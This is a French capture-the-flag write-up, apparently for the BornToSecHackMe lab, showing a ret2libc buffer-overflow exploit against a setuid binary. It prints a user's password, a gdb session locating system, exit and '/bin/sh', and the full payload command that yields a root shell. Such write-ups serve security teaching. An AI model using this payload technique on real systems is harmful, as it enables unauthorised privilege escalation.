# Solution 4

De la même manière que le `writeup3`, nous allons à nouveau exploiter l'exécutable présent dans le home de l'utilisateur `zaz`.

`zaz:646da671ca01bb5d84dbb5fb2238dc8e`

Les solutions précédentes consistaient à exécuter un shellcode précédemment chargé en mémoire, soit directement sur la stack, soit dans une variable d'environnement.

Certaines protections existent pour se protéger des buffer overflows. Une des premières barrières a été de rendre la pile non exécutable. Ainsi, l’attaquant place son shellcode dans le buffer, ou dans une variable d’environnement (placée sur la pile), mais lorsque le flow d’exécution est redirigé vers son code, celui-ci ne s’exécute pas.

Nous allons donc utiliser un autre type d'exploit : `ret2libc`.

Le concept est simple, utiliser des fonction déjà programmée afin de déjouer les potentielles protections. Comme nous allons le voir, l'exploit est relativement simple, cela a donc du sens de l'utiliser même si aucune protection de ce type n'est présente.

La libc comporte une fonction `system()` qui exécute des commandes. Si nous parvenons à l'appeler en lui fournissant les bons arguments, nous pourrons par exemple faire :

```C
system("/bin/sh")
```

Ce qui nous lancerait un shell `root`.

Pour ce faire, il nous faut placer la `stack` dans la bonne configuration :

![ret2libc](/images/ret2libc.png)

Notre commande sera donc du type :

`./exploit me $(python -c 'print("A"*140 + "addresse de system()" + "AAAA" + "adresse de /bin/sh")')`

Nous récupérons donc les adresse dont nous avons besoin :

```shell
$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x80483f4
(gdb) r
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f4 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

- system = `0xb7e6b060`
- /bin/sh = `0xb7f8cc58`
- exit = `0xb7e5ebe0`

Nous allons mettre l'adresse de la fonction `exit` à la place des quatres `A` dans notre commande. Cela permettra au programme de quitter sans émettre d'erreurs.

Voici le résultat :

```shell
$ ./exploit_me $(python -c 'print("A"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`X
# whoami
root
#
zaz@BornToSecHackMe:~$
```
